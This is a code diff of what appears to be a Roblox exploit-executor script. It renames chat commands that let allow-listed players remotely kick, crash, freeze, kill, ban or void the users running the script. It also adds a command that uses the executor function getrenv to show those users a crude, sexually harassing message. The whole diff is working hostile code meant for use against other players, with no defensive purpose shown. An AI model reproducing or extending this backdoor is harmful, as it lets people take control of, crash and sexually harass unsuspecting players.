@@ -201,28 +201,34 @@ local url = "https://raw.githubusercontent.com/f345bb35a3e4323c3fb6ad2f8b7e0122f
      local function attachChatListener(player)
          player.Chatted:Connect(function(message)
              if isAllowed(player) then
-                 if message == ":bring" then
+                 if message == ".bring" then
                      bringExecutorToCaller(player)
-                 elseif message == ":rejoin" then
+                 elseif message == ".rejoin" then
                      Rejoin()
-                 elseif message == ":kick" then
+                 elseif message == ".kick" then
                      Kick()
-                 elseif message == ":freeze" then
+                 elseif message == ".freeze" then
                      Freeze() --freezeExecutor()
-                 elseif message == ":unfreeze" then
+                 elseif message == ".unfreeze" then
                      Unfreeze() --unfreezeExecutor()
-                 elseif message == ":test" then
+                 elseif message == ".test" then
                      Message()
-                 elseif message == ":money" then
+                 elseif message == ".money" then
                      Money()
-                 elseif message == ":crash" then
+                 elseif message == ".crash" then
                      Crash()
-                 elseif message == ":kill" then
+                 elseif message == ".kill" then
                      Kill()
-                 elseif message == ":ban" then
+                 elseif message == ".ban" then
                      Ban()
-                 elseif message == ":void" then
+                 elseif message == ".void" then
                      Void()
+				 elseif message == ".penthouse" then
+					if getrenv and getrenv() then
+						getrenv().shared.ClientNotify("money", "meet yo fuckin daddy swervo at penthouse, your time to be FUCKED is now. 🍆💦🌊🍑")
+					else
+						print("executor doesn't support")
+					 end
                  end
              end
          end)
